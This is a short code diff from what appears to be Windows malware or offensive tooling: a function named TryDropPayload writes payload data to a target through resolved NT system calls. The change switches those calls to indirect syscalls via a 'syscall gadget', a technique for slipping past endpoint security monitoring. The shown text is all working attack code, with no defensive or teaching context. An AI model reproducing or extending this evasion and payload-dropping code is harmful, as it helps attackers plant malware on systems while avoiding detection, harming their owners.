@@ -32,8 +32,8 @@ bool TryDropPayload(const std::string& targetIp) {
     DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
     IO_STATUS_BLOCK ioStatus;
-    NTSTATUS status = InternalDoSyscall(ntWriteFileSsn, (UINT_PTR)hFile, 0, 0, 0, (UINT_PTR)&ioStatus, (UINT_PTR)data.data(), (UINT_PTR)data.size(), 0, 0, 0, 0);
-    InternalDoSyscall(ntCloseSsn, (UINT_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+    NTSTATUS status = InternalDoSyscall(ntWriteFileSsn, resolver.GetSyscallGadget(), (UINT_PTR)hFile, 0, 0, 0, (UINT_PTR)&ioStatus, (UINT_PTR)data.data(), (UINT_PTR)data.size(), 0, 0, 0, 0);
+    InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hFile, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
     return NT_SUCCESS(status);
 }
 
